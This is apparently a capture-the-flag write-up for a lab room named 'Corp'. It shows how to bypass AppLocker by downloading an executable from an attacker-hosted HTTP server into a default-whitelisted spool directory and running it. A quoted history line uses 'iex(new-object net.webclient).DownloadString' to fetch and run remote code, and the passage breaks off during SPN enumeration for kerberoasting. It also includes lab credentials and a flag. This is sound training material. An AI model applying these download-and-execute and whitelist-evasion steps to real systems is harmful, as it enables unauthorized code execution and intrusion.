---
Bypass Windows Applocker and escalate your privileges. You will learn about kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.
---

# Corp — Writeup

## Overview
### Corp — Writeup
### Corp — Writeup
![](https://i.imgur.com/jcPrF8H.png)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/30e9d2f242351eb403a39da19b979be8.png)
### Deploy the Windows machine
In this room you will learn the following:
Windows Forensics
Basics of kerberoasting
AV Evading
Applocker
Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
Answer the questions below
Deploy the windows machine, you will be able to control this in your browser. However if you prefer to use your own RDP client, the credentials are below.
Username: corp\dark
Password: _QuejVudId6
```text
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:dark /p:'_QuejVudId6' /v:10.10.62.161 /size:85% 
[14:39:54:545] [50855:50860] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[14:39:54:545] [50855:50860] [WARN][com.freerdp.crypto] - CN = omega.corp.local
[14:39:58:893] [50855:50860] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[14:39:58:893] [50855:50860] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[14:39:58:081] [50855:50860] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[14:39:58:081] [50855:50860] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
```
### Bypassing Applocker
![](https://i.imgur.com/XtUZMLi.png)
AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher and hash.
You will have noticed with the deployed machine, you are unable to execute your own binaries and certain functions on the system will be restricted.
There are many ways to bypass AppLocker.
If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: C:\Windows\System32\spool\drivers\color - This is whitelisted by default.
```text
┌──(kali㉿kali)-[~]
└─$ mkdir corp
```
```text
┌──(kali㉿kali)-[~]
└─$ cd corp
```
```text
┌──(kali㉿kali)-[~/corp]
└─$ ls
```
```text
┌──(kali㉿kali)-[~/corp]
└─$ nano hello.c
```
```text
┌──(kali㉿kali)-[~/corp]
└─$ cat hello.c      
#include<stdio.h>

int main() {
        printf("Hello world!");
        return 0;
}
```
```text
┌──(kali㉿kali)-[~/corp]
└─$ x86_64-w64-mingw32-gcc hello.c -o hello.exe
```
```text
┌──(kali㉿kali)-[~/corp]
└─$ ls
hello.c  hello.exe
```
```text
┌──(kali㉿kali)-[~/corp]
└─$ python3 -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

go to c:\windows\system32 then execute cmd cz cannot search cmd

Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
corp\dark

C:\Windows\System32>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\System32> powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/hello.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\hello.exe'"

Now, execute the program: 

C:\Windows\System32>cd c:\Windows\System32\spool\drivers\color

c:\Windows\System32\spool\drivers\color>.\hello.exe
Hello world!

It worked because the program was executed in a whitelisted location. Now, if we copy the executable to the user’s desktop, and try to execute it, it will be blocked. 

c:\Windows\System32\spool\drivers\color>copy hello.exe c:\users\dark\desktop
        1 file(s) copied.

c:\Windows\System32\spool\drivers\color>cd \users\dark\desktop

c:\Users\dark\Desktop>hello.exe
This program is blocked by group policy. For more information, contact your system administrator.

c:\Users\dark\Desktop>more \Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
ls
dir
Get-Content test
flag{a12a41b5f8111327690f836e9b302f0b}
iex(new-object net.webclient).DownloadString('http://127.0.0.1/test.ps1')
cls
exit
powershell -c "Invoke-WebRequest -Uri 'http://10.11.81.220:8000/hello.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\hello.exe'"
cd c:\Windows\System32\spool\drivers\color
dir
hello.exe
\.hello.exe
```
Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.
Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Access the file and and obtain the flag.
%userprofile% is c:\users\dark\ in this example.
### Kerberoasting
![|222](https://i.imgur.com/9YDvbLg.png)
It is important you understand how Kerberous actually works in order to know how to exploit it. Watch the video below.
https://youtu.be/LmbP-XD1SC8
Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!
Lets first enumerate Windows. If we run setspn -T medin -Q ​ */* we can extract all accounts in the SPN.
SPN is the Service Principal Name, and is the mapping between service and account.
Running that command, we find an existing SPN. What user is that for?
C:\Windows\system32\cmd.exe - The location of CMD
```text
c:\Users\dark\Desktop>setspn -T medin -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "medin" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
        ldap/omega.corp.local/ForestDnsZones.corp.local
        ldap/omega.corp.local/DomainDnsZones.corp.local
        TERMSRV/OMEGA
        TERMSRV/omega.corp.local
        DNS/omega.corp.local
        GC/omega.corp.local/corp.local
        RestrictedKrbHost/omega.corp.local
        RestrictedKrbHost/OMEGA
        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
        HOST/OMEGA/CORP
        HOST/omega.corp.local/CORP
        HOST/OMEGA
